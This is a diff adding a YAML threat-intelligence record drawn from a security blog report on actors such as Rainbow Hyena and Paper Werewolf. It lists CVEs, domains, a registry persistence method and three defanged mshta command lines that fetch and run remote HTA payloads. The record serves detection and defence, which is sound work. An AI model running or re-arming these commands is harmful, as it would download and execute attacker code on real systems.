@@ -1,0 +1,42 @@
+title: Threat Intelligence on Vulnerabilities, Adversary Techniques, and Tools
+description: Threat actors exploit vulnerabilities and use legitimate tools to achieve
+  their goals. This report details specific techniques and tools used by threat actors
+  like Rainbow Hyena, Paper Werewolf, and others.
+attribution: ''
+malware_families: []
+cves:
+- CVE202510114
+- CVE202510116
+- CVE20258088
+- CVE20256218
+ttps:
+  processes:
+  - mshta.exe
+  - cmd.exe
+  command_lines:
+  - mshta hxxps://beltifay[.]com/impugnable/orthodox/nurses/intuitively/annexed.hta
+  - mshta hxxps://www.****elearning.or[.]kr/popup/handle/1.html
+  - cmd.exe /c mshta hxxp[:]//github.githubassets[.]process/okagbfk867hmx2tvaxhc8zyq9fy694gf/hta
+  powershell: []
+  scripts: []
+  registry_keys:
+  - HKEY_CURRENT_USER\SOFTWARE\Microsoft\WindowsNT\
+  image_loads: []
+  network_connections: []
+  file_activity: []
+  persistence:
+  - Registry Run key (HKEY_CURRENT_USER) pointing to a malicious HTA URL
+  process_relations: []
+iocs:
+  hashes: []
+  ip_addresses: []
+  domains:
+  - e-aks[.]uz
+  - beltifay[.]com
+  - www.****elearning.or[.]kr
+  urls:
+  - hxxps://beltifay[.]com/impugnable/orthodox/nurses/intuitively/annexed.hta
+authors: []
+reference: https://bi.zone/eng/expertise/blog/kak-predotvratit-ataku-ispolzuya-dannye-ob-uyazvimostyakh-i-metodakh-zloumyshlennikov
+date_of_publication: December 01, 2025
+file_creation_date: May 01, 2026
